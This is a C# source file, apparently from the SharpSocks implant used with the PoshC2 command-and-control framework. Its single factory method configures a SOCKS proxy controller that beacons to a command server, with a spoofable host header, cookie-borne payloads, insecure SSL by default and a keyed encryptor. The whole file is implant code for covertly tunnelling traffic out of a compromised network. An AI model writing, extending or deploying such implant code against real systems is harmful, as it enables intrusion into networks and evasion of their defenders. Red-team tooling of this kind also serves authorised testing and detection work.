using System;
using System.Collections.Generic;
using System.Net;
using SharpSocksCommon.Encryption;
using SharpSocksImplant.Config;
using SharpSocksImplant.Logging;
using SharpSocksImplant.Socks;

namespace SharpSocksImplant.Integration
{
    public static class PoshCreateProxy
    {
        public static SocksController CreateSocksController(Uri serverUri, string commandChannelId, string hostHeader, string userAgent, string key, List<string> urlPaths,
            string sessionCookieName, string payloadCookieName, ushort timeBetweenReads, IWebProxy wbProxy, short beaconTime, IImplantLog implantComms, bool insecureSSL = true)
        {
            var implantLog = implantComms ?? new PoshDefaultImplantComms();
            var config = new SocksClientConfiguration
            {
                CommandChannelSessionId = commandChannelId,
                BeaconTime = beaconTime,
                UserAgent = userAgent,
                CommandServerUi = serverUri,
                UseProxy = wbProxy != null,
                WebProxy = wbProxy,
                UrlPaths = urlPaths,
                ImplantComms = implantLog,
                HostHeader = hostHeader,
                PayloadCookieName = payloadCookieName,
                SessionCookieName = sessionCookieName,
                InsecureSSL = insecureSSL,
                TimeBetweenReads = timeBetweenReads,
            };
            if (key == null)
                throw new Exception("Encryption key is null");
            var socksController = new SocksController(config)
            {
                Encryptor = new DebugSimpleEncryptor(key),
                ImplantComms = implantLog
            };
            socksController.Initialize();
            return socksController;
        }
    }
}